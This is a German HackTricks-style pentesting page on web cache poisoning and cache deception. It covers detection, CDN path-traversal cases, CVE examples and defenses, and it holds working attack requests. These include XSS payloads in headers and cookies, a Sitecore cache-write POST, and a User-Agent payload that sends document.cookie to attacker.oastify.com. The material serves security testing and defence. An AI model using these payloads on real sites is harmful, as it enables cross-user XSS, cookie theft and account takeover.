# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## Der Unterschied

> **Was ist der Unterschied zwischen web cache poisoning und web cache deception?**
>
> - In **web cache poisoning** verursacht der Angreifer, dass die Anwendung schädlichen Inhalt im Cache speichert, und dieser Inhalt wird aus dem Cache an andere Anwender der Anwendung ausgeliefert.
> - In **web cache deception** bewirkt der Angreifer, dass die Anwendung sensiblen Inhalt eines anderen Benutzers im Cache speichert, und der Angreifer ruft diesen Inhalt anschließend aus dem Cache ab.

## Cache Poisoning

Cache poisoning zielt darauf ab, den clientseitigen Cache zu manipulieren, um Clients dazu zu bringen, Ressourcen zu laden, die unerwartet, unvollständig oder unter der Kontrolle eines Angreifers sind. Das Ausmaß der Auswirkungen hängt von der Beliebtheit der betroffenen Seite ab, da die vergiftete Antwort ausschließlich an Nutzer ausgeliefert wird, die die Seite während der Periode der Cache-Kontamination besuchen.

Die Durchführung eines cache poisoning-Angriffs umfasst mehrere Schritte:

1. **Identifizierung von nicht als Cache-Schlüssel verwendeten Eingaben**: Dies sind Parameter, die zwar nicht erforderlich sind, damit eine Anfrage gecacht wird, aber die vom Server zurückgegebene Antwort verändern können. Diese Eingaben zu identifizieren ist entscheidend, da sie ausgenutzt werden können, um den Cache zu manipulieren.
2. **Ausnutzung der nicht als Cache-Schlüssel verwendeten Eingaben**: Nachdem die nicht als Cache-Schlüssel verwendeten Eingaben identifiziert wurden, besteht der nächste Schritt darin herauszufinden, wie diese Parameter missbraucht werden können, um die Serverantwort so zu verändern, dass es dem Angreifer nützt.
3. **Sicherstellen, dass die vergiftete Antwort gecacht wird**: Der letzte Schritt besteht darin sicherzustellen, dass die manipulierte Antwort im Cache gespeichert wird. Auf diese Weise erhält jeder Nutzer, der die betroffene Seite besucht, während der Cache vergiftet ist, die vergiftete Antwort.

### Erkennung: HTTP-Header prüfen

Normalerweise, wenn eine Antwort **im Cache gespeichert** wurde, gibt es einen **Header, der dies anzeigt**. Welche Header du beachten solltest, kannst du in diesem Beitrag prüfen: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Erkennung: Fehlercodes im Cache

Wenn du vermutest, dass die Antwort im Cache gespeichert wird, kannst du versuchen, **Anfragen mit einem fehlerhaften Header zu senden**, auf die mit einem **Statuscode 400** geantwortet werden sollte. Versuche dann, die Anfrage normal aufzurufen, und wenn die **Antwort ein 400er-Statuscode** ist, weißt du, dass es verwundbar ist (und du könntest sogar einen DoS durchführen).

You can find more options in:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Beachte jedoch, dass **manche dieser Statuscodes nicht gecacht werden**, sodass dieser Test möglicherweise nicht zuverlässig ist.

### Erkennung: Nicht als Cache-Schlüssel verwendete Eingaben identifizieren und bewerten

Du kannst [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) verwenden, um **brute-force parameters and headers** durchzuführen, die möglicherweise **die Antwort der Seite verändern**. Zum Beispiel könnte eine Seite den Header `X-Forwarded-For` verwenden, um dem Client anzuzeigen, das Script von dort zu laden:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Schädliche Antwort vom Back-End-Server auslösen

Mit dem identifizierten Parameter/Header prüfe, wie er **bereinigt** wird und **wo** er **reflektiert wird** oder die Antwort über den Header beeinflusst. Kannst du ihn trotzdem ausnutzen (XSS ausführen oder JS-Code laden, den du kontrollierst? DoS durchführen?...)

### Die Antwort cachen

Sobald du die **Seite** **identifiziert** hast, die missbraucht werden kann, welchen **Parameter**/**Header** zu verwenden ist und **wie** du ihn **ausnutzen** kannst, musst du die Seite im Cache ablegen. Je nach Ressource, die du in den Cache bringen willst, kann das einige Zeit dauern; du musst eventuell mehrere Sekunden lang versuchen.

Der Header **`X-Cache`** in der Response kann sehr nützlich sein, da er den Wert **`miss`** haben kann, wenn die Anfrage nicht gecached wurde, und den Wert **`hit`** wenn sie gecached ist.\
Der Header **`Cache-Control`** ist ebenfalls interessant, um zu wissen, ob eine Ressource gecached wird und wann sie das nächste Mal neu gecached wird: `Cache-Control: public, max-age=1800`

Ein weiterer interessanter Header ist **`Vary`**. Dieser Header wird oft verwendet, um **zusätzliche Header anzugeben**, die als **Teil des Cache-Schlüssels** behandelt werden, selbst wenn sie normalerweise nicht als Schlüssel verwendet werden. Daher kann, wenn der Angreifer den `User-Agent` des Opfers kennt, er den Cache für Nutzer vergiften, die genau diesen `User-Agent` verwenden.

Ein weiterer mit dem Cache verwandter Header ist **`Age`**. Er gibt die Zeit in Sekunden an, die das Objekt im Proxy-Cache war.

Beim Cachen einer Anfrage sei **vorsichtig mit den Headern, die du verwendest**, da einige von ihnen **unerwartet als Schlüssel verwendet** werden könnten und das **Opfer denselben Header verwenden muss**. Teste immer eine Cache Poisoning mit **verschiedenen Browsern**, um zu prüfen, ob sie funktioniert.

## Exploit-Beispiele

### Einfachstes Beispiel

Ein Header wie `X-Forwarded-For` wird ungefiltert in der Antwort reflektiert.\
Du kannst eine einfache XSS-Payload senden und den Cache vergiften, sodass alle, die die Seite aufrufen, XSSed werden:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Beachte, dass dies eine Anfrage an `/en?region=uk` poisoniert, nicht an `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning durch CDNs

In **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** wird folgendes einfaches Szenario erklärt:

- Das CDN cached alles unter `/share/`
- Das CDN wird `%2F..%2F` NICHT decodieren oder normalisieren, daher kann es als **path traversal** verwendet werden, um auf andere sensible Orte zuzugreifen, die gecached werden, wie `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Der Webserver wird `%2F..%2F` DEKODIEREN und normalisieren und antwortet mit `/api/auth/session`, welches den auth token enthält.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies könnten auch in der Antwort einer Seite reflektiert werden. Wenn du das ausnutzen kannst, um beispielsweise eine XSS zu verursachen, könntest du in der Lage sein, XSS in mehreren Clients auszunutzen, die die bösartige cache response laden.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Beachte, dass wenn das verwundbare Cookie häufig von den Nutzern verwendet wird, normale Anfragen den Cache bereinigen.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Siehe:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning mit path traversal, um einen API key zu stehlen <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Dieser Writeup erklärt**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html), wie es möglich war, einen OpenAI API key mit einer URL wie `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` zu stehlen, weil alles, was `/share/*` entspricht, zwischengespeichert wird, ohne dass Cloudflare die URL normalisiert, was erst durchgeführt wurde, als die Anfrage den Webserver erreichte.

Das ist auch besser erklärt in:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Manchmal müssen Sie **exploit several unkeyed inputs**, um einen Cache ausnutzen zu können. Zum Beispiel können Sie einen **Open redirect** finden, wenn Sie `X-Forwarded-Host` auf eine von Ihnen kontrollierte Domain setzen und `X-Forwarded-Scheme` auf `http`. **Wenn** der **Server** alle **HTTP**-Anfragen **auf HTTPS** weiterleitet und den Header `X-Forwarded-Scheme` als Domainnamen für die Weiterleitung verwendet, können Sie steuern, wohin die Seite durch die Weiterleitung zeigt.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Ausnutzen mit eingeschränktem `Vary`header

Wenn du feststellst, dass der **`X-Host`** Header als **Domainname zum Laden einer JS-Ressource** verwendet wird, der **`Vary`** Header in der Antwort jedoch **`User-Agent`** angibt. Dann musst du einen Weg finden, den User-Agent des Opfers zu exfiltrieren und den Cache mit diesem User-Agent zu vergiften:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Sende eine GET request, bei der die request sowohl in der URL als auch im body steht. Wenn der web server den Wert aus dem body verwendet, der cache server jedoch den aus der URL zwischenspeichert, wird jeder, der diese URL aufruft, tatsächlich den Parameter aus dem body verwenden. Wie die vuln, die James Kettle auf der Github website gefunden hat:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
Dazu gibt es ein PortSwigger-Lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Zum Beispiel ist es möglich, **parameters** in Ruby-Servern mit dem Zeichen **`;`** statt **`&`** zu trennen. Das kann verwendet werden, um unkeyed Parameterwerte in keyed ones zu platzieren und auszunutzen.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Erfahre hier, wie man [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning) durchführt.

### Automated testing for Web Cache Poisoning

Der [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) kann verwendet werden, um automatisch auf Web Cache Poisoning zu testen. Er unterstützt viele verschiedene Techniken und ist hochgradig anpassbar.

Beispiel: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Dieses reale Muster verknüpft eine header-basierte Reflection-Primitive mit CDN/WAF-Verhalten, um zuverlässig das gecachte HTML zu poisonen, das an andere Nutzer ausgeliefert wird:

- Das Haupt-HTML reflektierte einen untrusted request header (z. B. `User-Agent`) in einen ausführbaren Kontext.
- Das CDN entfernte cache-Header, aber ein interner/origin Cache existierte. Das CDN cached außerdem automatisch Requests, die auf statische Endungen enden (z. B. `.js`), während der WAF bei GETs für statische Assets eine schwächere Content-Inspektion anwendete.
- Request-Flow-Quirks erlaubten es, dass ein Request zu einem `.js`-Pfad den Cache-Key/Variant beeinflusste, der für das anschließende Haupt-HTML verwendet wurde, wodurch cross-user XSS via header reflection möglich wurde.

Praktische Vorgehensweise (beobachtet bei einem populären CDN/WAF):

1) Von einer clean IP (Vermeide vorherige reputation-based downgrades), setze einen bösartigen `User-Agent` über den Browser oder Burp Proxy Match & Replace.  
2) In Burp Repeater, bereite eine Gruppe von zwei Requests vor und nutze "Send group in parallel" (single-packet mode funktioniert am besten):
- First request: GET a `.js` resource path on the same origin while sending your malicious `User-Agent`.
- Immediately after: GET the main page (`/`).
3) Das CDN/WAF Routing-Rennen plus das auto-cached `.js` seedet häufig eine poisoned gecachte HTML-Variante, die dann an andere Besucher ausgeliefert wird, die dieselben Cache-Key-Bedingungen teilen (z. B. gleiche `Vary`-Dimensionen wie `User-Agent`).

Beispiel Header-Payload (um non-HttpOnly cookies zu exfiltrieren):
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Viele CDNs verbergen Cache-Header; poisoning kann sich nur in mehrstündigen Refresh-Zyklen zeigen. Verwende mehrere unterschiedliche Ausgangs-IP-Adressen und drossele, um Rate-Limit- oder Reputations-Trigger zu vermeiden.
- Die Verwendung einer IP aus der Cloud des CDN verbessert manchmal die Routing-Konsistenz.
- Wenn eine strikte CSP vorhanden ist, funktioniert das weiterhin, sofern die reflection im Haupt-HTML-Kontext ausgeführt wird und die CSP inline-Ausführung erlaubt oder durch den Kontext umgangen wird.

Impact:

- Wenn Session-Cookies nicht `HttpOnly` gesetzt sind, ist ein Zero-Click ATO möglich, indem `document.cookie` massenhaft von allen Nutzern exfiltriert wird, die das poisoned HTML erhalten.

Defenses:

- Stoppe das Reflektieren von Request-Headern in HTML; kontextkodieren (strictly context-encode), wenn unvermeidbar. Stimme CDN- und Origin-Cache-Policies aufeinander ab und vermeide Varying auf nicht vertrauenswürdigen Headern.
- Stelle sicher, dass der WAF Inhaltsinspektion konsistent auf `.js`-Requests und statische Pfade anwendet.
- Setze `HttpOnly` (und `Secure`, `SameSite`) auf Session-Cookies.

### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

A Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
Dies schreibt beliebiges HTML unter einem vom Angreifer gewählten cache key und ermöglicht präzises poisoning, sobald die cache keys bekannt sind.

Für vollständige Details (cache key construction, ItemService enumeration und eine verkettete post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Verwundbare Beispiele

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS leitete das Fragment in der URL weiter, ohne es zu entfernen, und erzeugte den cache key nur aus host, path und query (ignorierte das Fragment). Daher wurde die Anfrage `/#/../?r=javascript:alert(1)` an das backend als `/#/../?r=javascript:alert(1)` weitergeleitet und der cache key enthielt die Payload nicht, nur host, path und query.

### GitHub CP-DoS

Das Senden eines ungültigen Wertes im content-type header löste eine gecachte 405-Antwort aus. Der cache key enthielt das cookie, daher war ein Angriff nur gegen unauth users möglich.

### GitLab + GCP CP-DoS

GitLab nutzt GCP buckets zum Speichern statischer Inhalte. **GCP Buckets** unterstützen den **Header `x-http-method-override`**. Es war also möglich, den Header `x-http-method-override: HEAD` zu senden und den Cache so zu vergiften, dass eine leere response body zurückgegeben wurde. Es könnte auch die Methode `PURGE` unterstützen.

### Rack Middleware (Ruby on Rails)

In Ruby on Rails Anwendungen wird häufig Rack middleware verwendet. Zweck des Rack-Codes ist es, den Wert des **`x-forwarded-scheme`** Headers zu nehmen und als scheme der Anfrage zu setzen. Wenn der Header `x-forwarded-scheme: http` gesendet wird, erfolgt ein 301 redirect zur gleichen Location, was potentiell einen Denial of Service (DoS) für diese Ressource verursachen kann. Zusätzlich könnte die Anwendung den `X-forwarded-host` Header anerkennen und Benutzer zum angegebenen Host weiterleiten. Dieses Verhalten kann dazu führen, dass JavaScript-Dateien von einem Server des Angreifers geladen werden, was ein Sicherheitsrisiko darstellt.

### 403 and Storage Buckets

Cloudflare hat früher 403-Antworten gecacht. Der Versuch, S3 oder Azure Storage Blobs mit falschen Authorization-Headern zuzugreifen, führte zu einer 403-Antwort, die gecacht wurde. Obwohl Cloudflare aufgehört hat, 403-Antworten zu cachen, kann dieses Verhalten in anderen Proxy-Diensten noch vorhanden sein.

### Injecting Keyed Parameters

Caches schließen oft bestimmte GET-Parameter in den cache key ein. Beispielsweise hat Fastly's Varnish den `size`-Parameter in Requests gecacht. Wenn jedoch eine URL-codierte Version des Parameters (z. B. `siz%65`) mit einem fehlerhaften Wert gesendet wurde, wurde der cache key unter Verwendung des korrekten `size`-Parameters konstruiert. Das Backend verarbeitete jedoch den Wert im URL-codierten Parameter. Die URL-Codierung des zweiten `size`-Parameters führte dazu, dass er vom Cache weggelassen, aber vom Backend verwendet wurde. Einen Wert von 0 für diesen Parameter zuzuweisen führte zu einem cachebaren 400 Bad Request-Fehler.

### User Agent Rules

Einige Entwickler blockieren Requests mit user-agents, die zu stark frequentierten Tools wie FFUF oder Nuclei gehören, um die Serverlast zu steuern. Ironischerweise kann dieser Ansatz Schwachstellen wie cache poisoning und DoS einführen.

### Illegal Header Fields

Der [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) spezifiziert die zulässigen Zeichen in Header-Namen. Header, die Zeichen außerhalb des spezifizierten **tchar**-Bereichs enthalten, sollten idealerweise eine 400 Bad Request-Antwort auslösen. In der Praxis halten sich Server nicht immer an diesen Standard. Ein bemerkenswertes Beispiel ist Akamai, das Header mit ungültigen Zeichen weiterleitet und jeden 400-Fehler cached, solange der `cache-control`-Header nicht vorhanden ist. Ein ausnutzbares Muster wurde identifiziert, bei dem das Senden eines Headers mit einem illegalen Zeichen, wie `\`, zu einem cachebaren 400 Bad Request-Fehler führte.

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

Zunächst ist zu beachten, dass **extensions** wie `.css`, `.js`, `.png` usw. normalerweise so **konfiguriert** sind, dass sie im **cache** **gespeichert** werden. Daher wird die Antwort wahrscheinlich gespeichert, wenn Sie `www.example.com/profile.php/nonexistent.js` aufrufen, weil die `.js` **extension** erkannt wird. Wenn die **application** jedoch mit den **sensitive** Benutzerinhalten von _www.example.com/profile.php_ antwortet, können Sie diese Inhalte von anderen Benutzern **stehlen**.

Weitere Dinge zum Testen:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Ein weiteres sehr klares Beispiel findet sich in diesem Write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Im Beispiel wird erklärt, dass, wenn Sie eine nicht existierende Seite wie _http://www.example.com/home.php/non-existent.css_ laden, der Inhalt von _http://www.example.com/home.php_ (**mit den vertraulichen Informationen des Benutzers**) zurückgegeben wird und der cache server das Ergebnis speichern wird.\
Dann kann der **attacker** _http://www.example.com/home.php/non-existent.css_ in seinem eigenen Browser aufrufen und die **confidential information** der Benutzer sehen, die zuvor zugegriffen haben.

Beachte, dass der **cache proxy** so **konfiguriert** sein sollte, Dateien **basierend** auf der **extension** der Datei (_.css_) zu **cachen** und nicht auf dem content-type. Im Beispiel wird _http://www.example.com/home.php/non-existent.css_ einen `text/html` content-type statt eines `text/css` mime type haben.

Weitere Informationen dazu, wie man [ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception) durchführt.

## Automatische Tools

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner, um web cache poisoning Schwachstellen in einer Liste von URLs zu finden und mehrere Injection-Techniken zu testen.

## Referenzen

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)


{{#include ../../banners/hacktricks-training.md}}
